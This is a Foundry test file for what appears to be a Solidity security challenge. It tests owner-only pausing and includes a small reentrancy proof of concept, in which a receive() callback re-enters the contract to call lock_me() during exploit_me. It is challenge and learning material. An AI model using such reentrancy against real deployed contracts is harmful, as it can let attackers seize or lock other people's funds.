// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.13;

import "../src/Challenge.sol";
import {Test, console2} from "forge-std/Test.sol";

contract ChallengeTest is Test {
    Challenge chal;
    address owner = makeAddr("owner");
    address user = makeAddr("user");

    function setUp() public {
        vm.startPrank(owner);
        chal = new Challenge();
        vm.stopPrank();
    }

    function test_pause_only_owner_can_pause() public {
        vm.prank(owner);
        chal.pause(true);
        assertTrue(chal.isPause());

        vm.prank(user);
        vm.expectRevert();
        chal.pause(false);
    }

    function testFail_exploitMe_when_Paused_reverts() public {
        test_pause_only_owner_can_pause();
        vm.prank(user);
        // vm.expectRevert();
        chal.exploit_me("AMD");
    }

    function testFail_user_cant_exploitMe_when_not_locked() public {
        vm.prank(user);
        chal.exploit_me("AMD");
    }

    function test_can_reenter_set_lock() public {
        vm.prank(user);
        chal.exploit_me("AMD");
    }

    uint count;

    receive() external payable {
        if (count == 0) {
            count++;
            chal.lock_me();
            console2.log("Locked");
        }
    }
}
